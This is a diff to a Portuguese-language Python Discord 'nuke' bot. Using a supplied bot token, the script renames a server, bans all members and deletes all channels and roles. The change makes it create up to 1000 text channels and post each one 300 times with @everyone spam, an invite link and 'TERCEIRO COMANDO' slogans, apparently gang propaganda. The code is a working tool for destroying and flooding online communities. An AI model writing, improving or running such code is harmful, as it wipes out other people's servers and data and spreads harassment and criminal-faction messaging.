@@ -23,9 +23,9 @@ baner = f'''
 {r}|  \| | | | | |/ / _ {m}\  _ \ / _ \| __|
 {r}| |\  | |_| |   <  __{m}/ |_) | (_) | |_ 
 {r}|_| \_|\__,_|_|\_\___{m}|____/ \___/ \__|
-{y}Feito por: {g}https://github.com/SrDark222'''
+{y}Feito por: {g}https://github.com/Sigma-cc'''
 
-async def delete_all_channel(guild):
+async def delete_all_channels(guild):
     deleted = 0
     for channel in guild.channels:
         try:
@@ -55,50 +55,29 @@ async def ban_all_members(guild):
             continue
     return banned
 
-async def create_roles(guild, name):
+async def create_text_channels_and_send_messages(guild, name, message):
     created = 0
-    for _ in range(200 - len(guild.roles)):
-        try:
-            await guild.create_role(name=name)
-            created += 1
-        except:
-            continue
-    return created
-
-async def create_text_channels(guild, name):
-    created = 0
-    for _ in range(100 - len(guild.text_channels)):
+    for _ in range(1000):
         try:
             channel = await guild.create_text_channel(name=name)
-            await channel.send("@everyone @here\n\n# DKZIN DOMINA\nhttps://discord.com/invite/gZSx3n8Csa\n\n## TERCEIRO COMANDO NA FRENTE DE TODOS")
+            for _ in range(300):
+                await channel.send(message)
             created += 1
         except:
             continue
     return created
 
-async def create_voice_channels(guild, name):
-    created = 0
-    for _ in range(100 - len(guild.voice_channels)):
-        try:
-            await guild.create_voice_channel(name=name)
-            created += 1
-        except:
-            continue
-    return created
-
-async def nuke_guild(guild):
+async def nuke_guild(guild, name, message):
     print(f'{r}Nuke: {m}{guild.name}')
     await guild.edit(name="TERCEIRO COMANDO DA CAPITAL 🇮🇶")
     banned = await ban_all_members(guild)
     print(f'{m}Banidos:{b}{banned}')
-    deleted_channels = await delete_all_channel(guild)
+    deleted_channels = await delete_all_channels(guild)
     print(f'{m}Canais deletados:{b}{deleted_channels}')
     delete_roles = await delete_all_roles(guild)
     print(f'{m}Papéis deletados:{b}{delete_roles}')
-    created_text_channels = await create_text_channels(guild, name)
+    created_text_channels = await create_text_channels_and_send_messages(guild, name, message)
     print(f'{m}Canais de texto criados:{b}{created_text_channels}')
-    created_voice_channels = await create_voice_channels(guild, name)
-    print(f'{m}Canais de voz criados:{b}{created_voice_channels}')
     print(f'{r}--------------------------------------------\n\n')
 
 while True:
@@ -112,7 +91,8 @@ while True:
 {y}====>{g}''')
     if choice == '1':
         token = _input(f'{y}Insira o token do bot:{g}')
-        name = _input(f'{y}Insira o nome para os canais / papéis criados:{g}')
+        name = _input(f'{y}Insira o nome para os canais criados:{g}')
+        message = f'@everyone @here\n\n# DKZIN DOMINA\nhttps://discord.com/invite/gZSx3n8Csa\n\n## TERCEIRO COMANDO NA FRENTE DE TODOS'
         clear()
         choice_type = _input(f'''
 {baner}                
@@ -130,7 +110,7 @@ while True:
 [+]Logado como {client.user.name}
 [+]Bot em {len(client.guilds)} servidores!''')
                 for guild in client.guilds:
-                    await nuke_guild(guild)
+                    await nuke_guild(guild, name, message)
                 await client.close()
         elif choice_type == '2':
             guild_id = _input(f'{y}Insira o ID do servidor:{g}')
@@ -138,7 +118,7 @@ while True:
             async def on_ready():
                 for guild in client.guilds:
                     if str(guild.id) == guild_id:
-                        await nuke_guild(guild)
+                        await nuke_guild(guild, name, message)
                 await client.close()
         elif choice_type == '3':
             print(f'{dr}Saindo...')
